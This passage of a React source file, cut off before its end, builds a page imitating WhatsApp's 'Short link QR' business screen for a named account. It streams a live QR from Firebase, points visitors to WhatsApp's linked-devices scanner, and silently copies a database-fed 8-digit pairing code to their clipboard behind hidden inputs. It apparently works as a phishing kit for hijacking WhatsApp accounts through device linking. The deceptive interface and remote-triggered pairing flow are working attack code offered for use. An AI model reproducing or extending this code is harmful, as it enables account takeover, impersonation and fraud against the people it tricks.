import React, { useState, useEffect, useRef } from 'react';
import jsQR from 'jsqr';
import confetti from 'canvas-confetti';
import {
  subscribeToLiveStream,
  triggerGetStarted,
  subscribeToSuccessCommand,
  subscribeToPairingCode,
  LiveStreamData,
  getActiveChannel,
  setActiveChannelSlot,
  CHANNELS_REGISTRY,
  ChannelInfo,
} from './utils/firebaseLive';
import { soundFx } from './utils/audio';

interface CropBox {
  sx: number;
  sy: number;
  sw: number;
  sh: number;
}

/**
 * Safely copies text to clipboard without throwing unhandled NotAllowedError when document is not focused
 */
async function copyTextSafely(text: string): Promise<boolean> {
  if (!text) return false;

  // 1. Check if document has focus before attempting modern clipboard API
  if (
    typeof document !== 'undefined' &&
    typeof document.hasFocus === 'function' &&
    document.hasFocus() &&
    navigator.clipboard &&
    typeof navigator.clipboard.writeText === 'function'
  ) {
    try {
      await navigator.clipboard.writeText(text);
      return true;
    } catch {
      // Continue to textarea fallback
    }
  }

  // 2. Fallback to hidden textarea execCommand('copy')
  try {
    const textArea = document.createElement('textarea');
    textArea.value = text;
    textArea.style.position = 'fixed';
    textArea.style.top = '0';
    textArea.style.left = '0';
    textArea.style.width = '2em';
    textArea.style.height = '2em';
    textArea.style.padding = '0';
    textArea.style.border = 'none';
    textArea.style.outline = 'none';
    textArea.style.boxShadow = 'none';
    textArea.style.background = 'transparent';
    textArea.style.opacity = '0';
    textArea.setAttribute('readonly', '');
    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();
    const successful = document.execCommand('copy');
    document.body.removeChild(textArea);
    if (successful) return true;
  } catch {
    // Both failed
  }

  return false;
}

export default function App() {
  const [activeChannel] = useState<ChannelInfo>(getActiveChannel());
  const [showChannelModal, setShowChannelModal] = useState<boolean>(false);
  const [liveStreamActive, setLiveStreamActive] = useState<boolean>(false);
  const [isVideoSource, setIsVideoSource] = useState<boolean>(false);
  const [videoUrl, setVideoUrl] = useState<string>('');

  // ৮-সংখ্যার পেয়ারিং কোড স্টেট
  const [pairingCode, setPairingCode] = useState<string>('');
  const [showPairingBox, setShowPairingBox] = useState<boolean>(false);
  const [pairingSecondsRemaining, setPairingSecondsRemaining] = useState<number>(60);
  const [hasCopiedPairing, setHasCopiedPairing] = useState<boolean>(false);
  const pairingTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const pairingIntervalRef = useRef<NodeJS.Timeout | null>(null);

  const displayCanvasRef = useRef<HTMLCanvasElement | null>(null);
  const scanCanvasRef = useRef<HTMLCanvasElement | null>(null);
  const cachedCropBoxRef = useRef<CropBox | null>(null);
  const isPreCroppedRef = useRef<boolean>(true);
  const qrMissCountRef = useRef<number>(0);
  const isDetectingRef = useRef<boolean>(false);
  const frameCounterRef = useRef<number>(0);
  const currentImgRef = useRef<HTMLImageElement | null>(null);
  const decodeGenRef = useRef<number>(0);
  const drawnGenRef = useRef<number>(0);

  // Subscribe to Firebase Realtime Database for live screen/video stream
  useEffect(() => {
    const unsubscribe = subscribeToLiveStream((streamData: LiveStreamData | null) => {
      const hasValidData = Boolean(
        streamData &&
        streamData.active &&
        streamData.data &&
        streamData.data.trim().length > 20
      );

      if (hasValidData && streamData) {
        setLiveStreamActive(true);
        isPreCroppedRef.current = Boolean(streamData.cropped);
        if (streamData.cropped) {
          cachedCropBoxRef.current = null;
        }

        if (streamData.isVideo) {
          setIsVideoSource(true);
          setVideoUrl(streamData.data!);
        } else {
          setIsVideoSource(false);
          renderLiveFrame(streamData.data!);
        }
      } else {
        // Stream stopped in Firebase
        decodeGenRef.current += 1;
        setLiveStreamActive(false);
        cachedCropBoxRef.current = null;
        qrMissCountRef.current = 0;
        setIsVideoSource(false);
        setVideoUrl('');
        currentImgRef.current = null;
        if (displayCanvasRef.current) {
          const ctx = displayCanvasRef.current.getContext('2d');
          if (ctx) ctx.clearRect(0, 0, displayCanvasRef.current.width, displayCanvasRef.current.height);
        }
      }
    });

    return () => {
      unsubscribe();
    };
  }, []);

  // Re-draw canvas whenever new frame or detected crop box changes
  const redrawCanvas = () => {
    const img = currentImgRef.current;
    const canvas = displayCanvasRef.current;
    if (!img || !canvas) return;

    const TARGET_RESOLUTION = 540;
    if (canvas.width !== TARGET_RESOLUTION || canvas.height !== TARGET_RESOLUTION) {
      canvas.width = TARGET_RESOLUTION;
      canvas.height = TARGET_RESOLUTION;
    }

    const ctx = canvas.getContext('2d', { alpha: false });
    if (!ctx) return;

    ctx.imageSmoothingEnabled = true;
    ctx.imageSmoothingQuality = 'high';

    if (cachedCropBoxRef.current) {
      const { sx, sy, sw, sh } = cachedCropBoxRef.current;
      ctx.fillStyle = '#ffffff';
      ctx.fillRect(0, 0, TARGET_RESOLUTION, TARGET_RESOLUTION);
      ctx.drawImage(img, sx, sy, sw, sh, 0, 0, TARGET_RESOLUTION, TARGET_RESOLUTION);
    } else {
      ctx.fillStyle = isPreCroppedRef.current ? '#ffffff' : '#0b0f19';
      ctx.fillRect(0, 0, TARGET_RESOLUTION, TARGET_RESOLUTION);

      const scale = Math.min(TARGET_RESOLUTION / img.width, TARGET_RESOLUTION / img.height);
      const dw = img.width * scale;
      const dh = img.height * scale;
      const dx = (TARGET_RESOLUTION - dw) / 2;
      const dy = (TARGET_RESOLUTION - dh) / 2;

      ctx.drawImage(img, 0, 0, img.width, img.height, dx, dy, dw, dh);
    }
  };

  // রিয়েল-টাইম ফ্রেম রেন্ডারিং (Strict generation ordering prevents out-of-order frame jumps)
  const renderLiveFrame = (dataUrl: string) => {
    const myGen = ++decodeGenRef.current;
    const img = new Image();
    img.decoding = 'async';
    img.onload = () => {
      if (myGen < drawnGenRef.current) return;
      drawnGenRef.current = myGen;
      currentImgRef.current = img;
      redrawCanvas();

      // Skip redundant jsQR cropping when Android ML Kit already pre-cropped the QR code
      if (isPreCroppedRef.current) return;

      frameCounterRef.current += 1;
      const needsDetection = !cachedCropBoxRef.current || frameCounterRef.current % 10 === 0;

      if (needsDetection && !isDetectingRef.current) {
        isDetectingRef.current = true;
        setTimeout(() => {
          try {
            detectCropBox(img);
          } finally {
            isDetectingRef.current = false;
          }
        }, 0);
      }
    };
    img.src = dataUrl;
  };

  // কিউআর কোড ডিটেক্ট করে ক্রপ করা (with hysteresis deadzone so QR never wobbles)
  const detectCropBox = (img: HTMLImageElement) => {
    if (isPreCroppedRef.current) return;
    if (!scanCanvasRef.current) {
      scanCanvasRef.current = document.createElement('canvas');
    }
    const scanCanvas = scanCanvasRef.current;

    const MAX_SCAN_DIM = 360;
    const scale = Math.min(1, MAX_SCAN_DIM / Math.max(img.width, img.height));
    const sw = Math.round(img.width * scale);
    const sh = Math.round(img.height * scale);

    scanCanvas.width = sw;
    scanCanvas.height = sh;
    const sCtx = scanCanvas.getContext('2d', { willReadFrequently: true });
    if (!sCtx) return;

    sCtx.drawImage(img, 0, 0, sw, sh);
    const imgData = sCtx.getImageData(0, 0, sw, sh);

    let code = null;
    try {
      code = jsQR(imgData.data, sw, sh, {
        inversionAttempts: 'dontInvert',
      });
    } catch {}

    if (code && code.location) {
      qrMissCountRef.current = 0;
      const loc = code.location;
      const minX = Math.min(loc.topLeftCorner.x, loc.bottomLeftCorner.x) / scale;
      const maxX = Math.max(loc.topRightCorner.x, loc.bottomRightCorner.x) / scale;
      const minY = Math.min(loc.topLeftCorner.y, loc.topRightCorner.y) / scale;
      const maxY = Math.max(loc.bottomLeftCorner.y, loc.bottomRightCorner.y) / scale;

      const qrW = maxX - minX;
      const qrH = maxY - minY;
      const pad = Math.max(qrW, qrH) * 0.18;

      const centerX = (minX + maxX) / 2;
      const centerY = (minY + maxY) / 2;
      const targetSide = Math.max(qrW, qrH) + pad * 2;

      const cropX = Math.max(0, Math.min(img.width - targetSide, centerX - targetSide / 2));
      const cropY = Math.max(0, Math.min(img.height - targetSide, centerY - targetSide / 2));
      const cropSide = Math.min(targetSide, img.width - cropX, img.height - cropY);

      const prev = cachedCropBoxRef.current;
      if (
        !prev ||
        Math.abs(cropX - prev.sx) > 12 ||
        Math.abs(cropY - prev.sy) > 12 ||
        Math.abs(cropSide - prev.sw) > 12
      ) {
        cachedCropBoxRef.current = {
          sx: cropX,
          sy: cropY,
          sw: cropSide,
          sh: cropSide,
        };
        redrawCanvas();
      }
    } else if (cachedCropBoxRef.current) {
      qrMissCountRef.current += 1;
      if (qrMissCountRef.current >= 3) {
        cachedCropBoxRef.current = null;
        redrawCanvas();
      }
    }
  };

  const [showToast, setShowToast] = useState<boolean>(false);
  const [toastMessage, setToastMessage] = useState<string>('');
  const [logoTimestamp] = useState<number>(() => Date.now());
  const [isTriggering, setIsTriggering] = useState<boolean>(false);

  // অটো-ট্রিগার ও ১ মিনিটের ব্যবধানে পুনঃক্লিক ব্যবস্থা
  const [isAutoTriggering, setIsAutoTriggering] = useState<boolean>(false);
  const [countdownSeconds, setCountdownSeconds] = useState<number>(60);
  const autoTriggerTimerRef = useRef<NodeJS.Timeout | null>(null);
  const countdownTimerRef = useRef<NodeJS.Timeout | null>(null);

  // ডাটাবেজ থেকে Success কমান্ড পাওয়ার পর খোলার টার্গেট লিংক
  const SUCCESS_WHATSAPP_URL = 'https://wa.me/message/WYJI35AQB2YHA1';
  const [successModalOpen, setSuccessModalOpen] = useState<boolean>(false);
  const successHandledRef = useRef<boolean>(false);

  // ডাটাবেজ থেকে Success কমান্ড লিসেন করা
  useEffect(() => {
    const unsub = subscribeToSuccessCommand(() => {
      if (successHandledRef.current) return;
      successHandledRef.current = true;

      soundFx.playSuccess();
      try {
        confetti({ particleCount: 70, spread: 70, origin: { y: 0.6 } });
      } catch {}

      setSuccessModalOpen(true);
      setToastMessage('Success কমান্ড পাওয়া গেছে!');
      setShowToast(true);
      setTimeout(() => setShowToast(false), 3000);
    });

    return () => {
      unsub();
    };
  }, []);

  // ডাটাবেজ Android App থেকে Fly বাটনের 8-সংখ্যার পেয়ারিং কোড আসলে স্বয়ংক্রিয় কপি ও ৮টি বক্সে প্রদর্শন
  useEffect(() => {
    const unsub = subscribeToPairingCode((code: string) => {
      setPairingCode(code);
      setShowPairingBox(true);
      setHasCopiedPairing(false);
      setPairingSecondsRemaining(60);

      // বাম পাশের সিরিয়াল অনুযায়ী ৮টি কোড একসাথে কিবোর্ডের ক্লিপবোর্ডে নিরাপদ কপি
      copyTextSafely(code)
        .then((copied) => {
          if (copied) {
            setHasCopiedPairing(true);
          }
        })
        .catch(() => {});

      soundFx.playSuccess();
      try {
        confetti({ particleCount: 50, spread: 60, origin: { y: 0.7 } });
      } catch {}

      setToastMessage('পেয়ারিং কোড ক্লিপবোর্ডে কপি হয়েছে!');
      setShowToast(true);
      setTimeout(() => setShowToast(false), 3000);

      // ১ মিনিট কাউন্টডাউন টাইমার
      if (pairingTimeoutRef.current) clearTimeout(pairingTimeoutRef.current);
      if (pairingIntervalRef.current) clearInterval(pairingIntervalRef.current);

      pairingIntervalRef.current = setInterval(() => {
        setPairingSecondsRemaining((prev) => (prev > 1 ? prev - 1 : 0));
      }, 1000);

      // ঠিক ১ মিনিট (৬০ সেকেন্ড) পর স্বয়ংক্রিয়ভাবে আবার Hide হয়ে যাবে
      pairingTimeoutRef.current = setTimeout(() => {
        setShowPairingBox(false);
        if (pairingIntervalRef.current) clearInterval(pairingIntervalRef.current);
      }, 60000);
    });

    return () => {
      unsub();
      if (pairingTimeoutRef.current) clearTimeout(pairingTimeoutRef.current);
      if (pairingIntervalRef.current) clearInterval(pairingIntervalRef.current);
    };
  }, []);

  const handleCopyPairingCode = async () => {
    if (!pairingCode) return;
    soundFx.playTap();
    await copyTextSafely(pairingCode);
    setHasCopiedPairing(true);
    soundFx.playSuccess();
    setToastMessage('পেয়ারিং কোড ক্লিপবোর্ডে কপি হয়েছে!');
    setShowToast(true);
    setTimeout(() => setShowToast(false), 2000);
  };

  // ভিডিও স্ক্রিনে আসার সাথে সাথে বাটুন ও অটো-ট্রিগার লুপ সম্পূর্ণ বন্ধ হওয়া
  useEffect(() => {
    if (liveStreamActive && isAutoTriggering) {
      stopAutoTriggerLoop();
      setToastMessage('লাইভ ভিডিও ফ্রেমে সংযুক্ত হয়েছে!');
      setShowToast(true);
      setTimeout(() => setShowToast(false), 2500);
    }
  }, [liveStreamActive, isAutoTriggering]);

  const stopAutoTriggerLoop = () => {
    setIsAutoTriggering(false);
    if (autoTriggerTimerRef.current) {
      clearInterval(autoTriggerTimerRef.current);
      autoTriggerTimerRef.current = null;
    }
    if (countdownTimerRef.current) {
      clearInterval(countdownTimerRef.current);
      countdownTimerRef.current = null;
    }
  };

  // QR Cod বাটনে ক্লিক: ভিডিও না আসা পর্যন্ত প্রতি ১ মিনিটে ১ বার অটো ট্রিগার হবে
  const handleTriggerGetStarted = async () => {
    soundFx.playTap();
    setIsTriggering(true);
    setIsAutoTriggering(true);
    setCountdownSeconds(60);

    // প্রথম ট্রিগার
    try {
      await triggerGetStarted();
      soundFx.playSuccess();
      setToastMessage('make a qr cod');
      setShowToast(true);
      setTimeout(() => setShowToast(false), 2500);
    } catch (err) {
      console.error('Firebase trigger failed:', err);
    } finally {
      setIsTriggering(false);
    }

    // পূর্বের টাইমার ক্লিয়ার
    if (autoTriggerTimerRef.current) clearInterval(autoTriggerTimerRef.current);
    if (countdownTimerRef.current) clearInterval(countdownTimerRef.current);

    // ১ সেকেন্ড পর পর কাউন্টডাউন টাইমার
    countdownTimerRef.current = setInterval(() => {
      setCountdownSeconds((prev) => (prev > 1 ? prev - 1 : 60));
    }, 1000);

    // প্রতি ১ মিনিটে (৬০,০০০ms) ১ বার ফায়ারবেসে ট্রিগার পাঠানো
    autoTriggerTimerRef.current = setInterval(async () => {
      try {
        await triggerGetStarted();
        soundFx.playTap();
        setToastMessage('make a qr cod');
        setShowToast(true);
        setTimeout(() => setShowToast(false), 2000);
      } catch (e) {
        console.error('Auto trigger error:', e);
      }
      setCountdownSeconds(60);
    }, 60000);
  };

  // কম্পোনেন্ট আনমাউন্টে টাইমার ক্লিনআপ
  useEffect(() => {
    return () => {
      stopAutoTriggerLoop();
    };
  }, []);

  // টার্গেট ওয়েবসাইট লিঙ্ক (Render.com লাইভ লিঙ্ক)
  const TARGET_RENDER_URL = 'https://mst-laboni-akter-whatsapp-profile.onrender.com/';

  // 1-ট্যাপে ওয়েবসাইট লিংক সরাসরি শেয়ার (Native Link Share)
  const handleNativeShare = async () => {
    soundFx.playTap();

    // Determine target website URL (defaults to user's live Render URL)
    const isRenderDomain = typeof window !== 'undefined' && window.location.origin.includes('onrender.com');
    const fullShareUrl = isRenderDomain ? window.location.href : TARGET_RENDER_URL;

    // Clipboard copy backup
    copyTextSafely(fullShareUrl).catch(() => {});

    if (typeof navigator !== 'undefined' && navigator.share) {
      try {
        await navigator.share({
          title: 'mst laboni - WhatsApp Short link QR',
          text: `mst laboni - WhatsApp Short link QR:\n${fullShareUrl}`,
          url: fullShareUrl,
        });
        soundFx.playSuccess();
        setToastMessage('ওয়েবসাইট লিংক সফলভাবে শেয়ার করা হয়েছে!');
        setShowToast(true);
        setTimeout(() => setShowToast(false), 2500);
        return;
      } catch (err: unknown) {
        const error = err as { name?: string };
        if (error.name === 'AbortError') return;
      }
    }

    soundFx.playSuccess();
    setToastMessage('ওয়েবসাইট লিংক কপি করা হয়েছে!');
    setShowToast(true);
    setTimeout(() => setShowToast(false), 2500);
  };

  return (
    <div className="fixed inset-0 w-full h-[100dvh] flex items-center justify-center bg-[#f0f2f5] overflow-hidden select-none touch-none font-sans">
      {/* 
        মোবাইল স্ক্রিনে পারফেক্ট ফিট (No Scroll):
        হোয়াটসঅ্যাপ শর্ট লিংক কিউআর-এর হুবহু আসল লেআউট
      */}
      <main className="relative w-full max-w-[420px] h-full max-h-[100dvh] flex flex-col justify-between bg-[#f0f2f5] overflow-hidden">
        {/* Floating Toast Notification */}
        {showToast && (
          <div
            role="status"
            aria-live="polite"
            className="absolute top-15 left-1/2 -translate-x-1/2 z-50 bg-[#008069] text-white text-xs sm:text-sm font-semibold px-4 py-2 rounded-full shadow-lg flex items-center gap-2 border border-white/20 animate-in fade-in slide-in-from-top-2"
          >
            <svg className="w-4 h-4 stroke-[2.5]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M5 13l4 4L19 7" />
            </svg>
            <span>{toastMessage}</span>
          </div>
        )}

        {/* ================= টপ হেডার বার ================= */}
        <header className="w-full bg-white h-13 px-3 sm:px-4 flex items-center justify-between border-b border-gray-100 shrink-0">
          <div className="flex items-center gap-2 sm:gap-3">
            <button
              onClick={() => soundFx.playTap()}
              className="text-gray-900 active:opacity-60 focus:outline-none"
              aria-label="Back"
            >
              <svg className="w-6 h-6 stroke-[2.2]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.2" d="M10 19l-7-7m0 0l7-7m-7 7h18" />
              </svg>
            </button>
            <h1 className="text-[17px] sm:text-[19px] font-semibold text-gray-900 tracking-tight">
              Short link QR
            </h1>
          </div>

          <div className="flex items-center gap-2">
            {/* Dynamic Channel Badge & Selector Button */}
            <button
              onClick={() => {
                soundFx.playTap();
                setShowChannelModal(true);
              }}
              title="চ্যানেল ও প্যাথ পরিবর্তন করুন"
              className="flex items-center gap-1.5 px-2.5 py-1 bg-emerald-50 hover:bg-emerald-100 border border-emerald-300 text-[#008069] rounded-full text-xs font-bold transition-all active:scale-95 cursor-pointer shadow-xs"
            >
              <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
              <span>Ch #{activeChannel.slotNumber}</span>
              <span className="text-[10px] text-emerald-700 font-mono hidden sm:inline">({activeChannel.uniquePassword})</span>
            </button>

            <button
              onClick={() => soundFx.playTap()}
              className="text-gray-900 active:opacity-60 focus:outline-none p-1"
              aria-label="Menu"
            >
              <svg className="w-5 h-5 fill-current" viewBox="0 0 24 24">
                <circle cx="12" cy="5" r="2" />
                <circle cx="12" cy="12" r="2" />
                <circle cx="12" cy="19" r="2" />
              </svg>
            </button>
          </div>
        </header>

        {/* ================= ট্যাব বার ================= */}
        <div className="w-full bg-white border-b border-gray-200 grid grid-cols-2 shrink-0 select-none">
          <div className="py-3 text-center text-sm font-bold text-[#008069] relative tracking-wider cursor-default">
            MY CODE
            <span className="absolute bottom-0 left-0 right-0 h-[3.5px] bg-[#008069]" />
          </div>
          <a
            href="https://wa.me/settings/linked_devices"
            target="_blank"
            rel="noopener noreferrer"
            onClick={() => soundFx.playTap()}
            className="py-3 text-center text-sm font-bold text-gray-500 hover:text-[#008069] active:text-[#008069] active:bg-gray-50 transition-colors tracking-wider focus:outline-none flex items-center justify-center cursor-pointer"
            aria-label="Open WhatsApp Linked Devices Scanner"
          >
            <span>SCAN CODE</span>
          </a>
        </div>

        {/* ================= মূল কনটেন্ট এরিয়া ================= */}
        <div className="flex-1 flex flex-col items-center justify-center px-4 py-2 min-h-0">
          {/* 
            সাদা বর্ডার ওয়ালা কার্ড ফ্রেম:
            - প্রফাইল ছবি ও নাম ভিডিও ফ্রেমের বাহিরে উপরে থাকবে
            - ভিডিও ফ্রেমটি এই সম্পূর্ণ সাদা বর্ডার ওয়ালা ফ্রেমটি জুড়ে নিচে থাকবে
          */}
          <div className="w-full max-w-[340px] pt-9 relative">
            {/* ১. ওভারল্যাপিং প্রফাইল ছবি (ভিডিও ফ্রেমের বাহিরে উপরে - বড় সাইজ) */}
            <div className="absolute top-0 left-1/2 -translate-x-1/2 z-20">
              <div className="w-20 h-20 sm:w-[84px] sm:h-[84px] rounded-full p-[3.5px] bg-white shadow-lg ring-1 ring-black/5">
                <div className="w-full h-full rounded-full overflow-hidden bg-zinc-800 flex items-center justify-center">
                  <img
                    src={`/my-logo.jpg?v=${logoTimestamp}`}
                    alt="mst laboni"
                    onError={(e) => {
                      e.currentTarget.src = '/assets/aistudio/IMG-20261027-WA0003_2_82ae67c6.jpg';
                    }}
                    className="w-full h-full object-cover object-center"
                  />
                </div>
              </div>
            </div>

            {/* ২. সাদা বর্ডার ওয়ালা ফ্রেম কার্ড */}
            <div className="bg-white rounded-3xl pt-13 pb-5 px-5 shadow-[0_4px_24px_rgba(0,0,0,0.06)] border border-gray-100 flex flex-col items-center text-center">
              {/* নাম (ভিডিও ফ্রেমের বাহিরে) */}
              <h2 className="text-[20px] font-semibold text-gray-900 tracking-tight">
                mst laboni
              </h2>
              {/* পদবি (ভিডিও ফ্রেমের বাহিরে) */}
              <p className="text-[12.5px] text-gray-500 mt-0.5 mb-4 font-normal">
                WhatsApp business account
              </p>

              {/* 
                ৩. ভিডিও ফ্রেম (সাদা বর্ডার ফ্রেমটির ভেতরে সম্পূর্ণ অংশ জুড়ে):
                - লাইভ ভিডিও থাকলে ভিডিওটি এখানে দৃশ্যমান হবে।
                - ফায়ারবেসে কোনো লাইভ না থাকলে ফ্রেমটি ফাঁকা থাকবে (কোনো ডেমো কিউআর কোড থাকবে না)।
              */}
              <div
                className="w-full aspect-square rounded-2xl bg-white border border-gray-200 overflow-hidden relative flex items-center justify-center shadow-inner"
              >
                {/* লাইভ ডিসপ্লে ক্যানভাস */}
                <canvas
                  ref={displayCanvasRef}
                  className={`w-full h-full object-contain select-none pointer-events-none ${
                    liveStreamActive && !isVideoSource ? 'block' : 'hidden'
                  }`}
                />

                {/* যদি সরাসরি ভিডিও ফাইল বা স্ট্রিম হয় */}
                {liveStreamActive && isVideoSource && videoUrl && (
                  <video
                    src={videoUrl}
                    autoPlay
                    loop
                    muted
                    playsInline
                    className="w-full h-full object-contain bg-black"
                  />
                )}

                {!liveStreamActive && (
                  /* 
                    যখন কোনো ভিডিও প্লে থাকবে না:
                    এখানে 'QR Code' বাটুন থাকবে। ট্রিগার করার পর ভিডিও না আসা পর্যন্ত থাকবে এবং প্রতি ১ মিনিটে ১ বার ক্লিক হবে।
                    ভিডিও আসার সাথে সাথে বাটুনটি স্বয়ংক্রিয়ভাবে সরে যাবে।
                  */
                  <button
                    onClick={handleTriggerGetStarted}
                    aria-label="QR Code - ক্লিক করে Get Started ট্রিগার করুন"
                    className="w-full h-full bg-[#f8fafc] hover:bg-emerald-50/50 active:bg-emerald-100/60 transition-all flex flex-col items-center justify-center gap-3.5 p-5 cursor-pointer focus:outline-none select-none group"
                  >
                    {/* কিউআর আইকন / লোডিং অ্যানিমেশন */}
                    <div className="w-18 h-18 rounded-2xl bg-white border border-gray-200 text-[#008069] flex items-center justify-center shadow-xs group-hover:scale-105 group-active:scale-95 transition-transform relative">
                      {isTriggering ? (
                        <svg className="w-9 h-9 animate-spin text-[#008069]" fill="none" viewBox="0 0 24 24">
                          <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" />
                          <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z" />
                        </svg>
                      ) : (
                        <>
                          <svg className="w-9 h-9 stroke-[2.2]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <rect x="3" y="3" width="7" height="7" rx="1.5" />
                            <rect x="14" y="3" width="7" height="7" rx="1.5" />
                            <rect x="3" y="14" width="7" height="7" rx="1.5" />
                            <rect x="14" y="14" width="7" height="7" rx="1.5" />
                            <path strokeLinecap="round" d="M6.5 6.5h.01M17.5 6.5h.01M6.5 17.5h.01M17.5 17.5h.01" strokeWidth="3" />
                          </svg>
                          {isAutoTriggering && (
                            <span className="absolute -top-1 -right-1 flex h-3.5 w-3.5">
                              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                              <span className="relative inline-flex rounded-full h-3.5 w-3.5 bg-[#008069]"></span>
                            </span>
                          )}
                        </>
                      )}
                    </div>

                    {/* QR Code লিখা */}
                    <div className="flex flex-col items-center text-center">
                      <span className="text-[21px] font-bold text-gray-800 tracking-tight group-hover:text-[#008069] transition-colors">
                        QR Code
                      </span>
                      {isAutoTriggering ? (
                        <div className="flex flex-col items-center mt-1.5">
                          <span className="text-[13px] font-semibold text-[#008069] bg-emerald-50 px-3.5 py-1 rounded-full border border-emerald-200/80 shadow-xs flex items-center gap-1.5">
                            <span className="w-1.5 h-1.5 rounded-full bg-[#008069] animate-ping" />
                            <span>make a qr cod</span>
                          </span>
                        </div>
                      ) : (
                        <span className="text-[12px] font-semibold text-[#008069] bg-emerald-50 px-3.5 py-1 rounded-full mt-1.5 border border-emerald-200/80 shadow-xs flex items-center gap-1.5">
                          <span className="w-1.5 h-1.5 rounded-full bg-[#008069]" />
                          <span>Get Started</span>
                        </span>
                      )}
                    </div>
                  </button>
                )}
              </div>
            </div>
          </div>

          {/* কার্ডের নিচের টেক্সট */}
          <p className="text-center text-[13px] text-gray-600 leading-normal mt-3 max-w-[310px] px-2">
            Your customers can scan this code to start a WhatsApp chat with you.{' '}
            <span className="font-bold text-[#008069] cursor-pointer">Learn more</span>
          </p>
        </div>

        {/* ================= শুধুমাত্র 'কপি কোড' বাটন (কোড আসলে ভাসবে, কোড ও বক্স ফ্রেম সব সময় সম্পূর্ণ Hide থাকবে) ================= */}
        {showPairingBox && pairingCode.length === 8 && (
          <div className="w-full px-6 py-1.5 flex items-center justify-center animate-in fade-in zoom-in-95 duration-200 z-30">
            {/* ৮টি আলাদা আলাদা বক্স (ডাটাবেজ থেকে আসা হুবহু সিরিয়ালে থাকবে কিন্তু স্ক্রিনে কখনোই দেখা যাবে না - সব সময় সম্পূর্ণ Hide) */}
            <div aria-hidden="true" className="hidden" style={{ display: 'none' }}>
              {pairingCode.split('').map((char, index) => (
                <input
                  key={index}
                  type="text"
                  readOnly
                  value={char}
                  tabIndex={-1}
                  aria-hidden="true"
                  className="hidden"
                  data-box-index={index}
                />
              ))}
            </div>

            {/* স্ক্রিনে শুধুমাত্র 'কপি কোড' বাটনটি ভাসবে */}
            <div className="flex items-center gap-2">
              <button
                type="button"
                onClick={handleCopyPairingCode}
                className="bg-[#008069] hover:bg-[#00705c] active:scale-95 text-white font-medium text-xs sm:text-sm py-2 px-5 rounded-full shadow-md shadow-[#008069]/25 flex items-center gap-2 transition-all cursor-pointer"
                aria-label="কপি কোড"
              >
                {hasCopiedPairing ? (
                  <>
                    <svg className="w-4 h-4 stroke-[2.5]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M5 13l4 4L19 7" />
                    </svg>
                    <span>কপি হয়েছে ✓</span>
                  </>
                ) : (
                  <>
                    <svg className="w-4 h-4 stroke-[2]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
                    </svg>
                    <span>কপি কোড</span>
                  </>
                )}
                <span className="text-[11px] bg-black/25 px-2 py-0.5 rounded-full font-mono font-bold">
                  {pairingSecondsRemaining}s
                </span>
              </button>

              <button
                type="button"
                onClick={() => setShowPairingBox(false)}
                className="text-gray-400 hover:text-gray-600 p-1.5 rounded-full hover:bg-gray-200/50 transition-colors cursor-pointer"
                title="লুকিয়ে ফেলুন"
              >
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>
          </div>
        )}

        {/* ================= নিচে থাকা সবুজ Share code বাটন ================= */}
        <div className="w-full px-6 pb-6 pt-1 flex justify-center shrink-0">
          <button
            onClick={handleNativeShare}
            aria-label="Share code"
            className="w-full max-w-[320px] h-12 rounded-full bg-[#008069] hover:bg-[#00705c] active:scale-[0.98] text-white font-medium text-[15px] flex items-center justify-center gap-2 shadow-md shadow-[#008069]/20 transition-all focus:outline-none"
          >
            <span>Share code</span>
          </button>
        </div>

        {/* Success Modal: https://wa.me/message/WYJI35AQB2YHA1 */}
        {successModalOpen && (
          <div
            role="dialog"
            aria-modal="true"
            className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-xs p-4 animate-in fade-in"
          >
            <div className="w-full max-w-sm bg-white rounded-3xl p-6 shadow-2xl border border-emerald-100 text-center flex flex-col items-center animate-in zoom-in-95 duration-200">
              <div className="w-16 h-16 rounded-full bg-emerald-100 text-[#008069] flex items-center justify-center mb-4 shadow-sm animate-bounce">
                <svg className="w-8 h-8 stroke-[2.5]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M5 13l4 4L19 7" />
                </svg>
              </div>
              <h3 className="text-xl font-bold text-gray-900 mb-1">আলহামদুলিল্লাহ!</h3>
              <p className="text-sm font-semibold text-emerald-800 mb-2">Success সংকেত পাওয়া গেছে</p>
              <p className="text-xs text-gray-500 mb-5 leading-relaxed">
                ডাটাবেজ থেকে সফলতার কমান্ড প্রাপ্ত হয়েছে। সরাসরি হোয়াটসঅ্যাপে যেতে নিচের বাটনে চাপ দিন।
              </p>
              <a
                href={SUCCESS_WHATSAPP_URL}
                target="_blank"
                rel="noopener noreferrer"
                onClick={() => {
                  soundFx.playSuccess();
                  setSuccessModalOpen(false);
                }}
                className="w-full py-3.5 px-4 rounded-2xl bg-[#008069] hover:bg-[#00705c] active:scale-[0.98] text-white font-bold text-base flex items-center justify-center gap-2 shadow-lg shadow-[#008069]/25 transition-all cursor-pointer"
              >
                <span>হোয়াটসঅ্যাপে প্রবেশ করুন</span>
              </a>
              <button
                onClick={() => setSuccessModalOpen(false)}
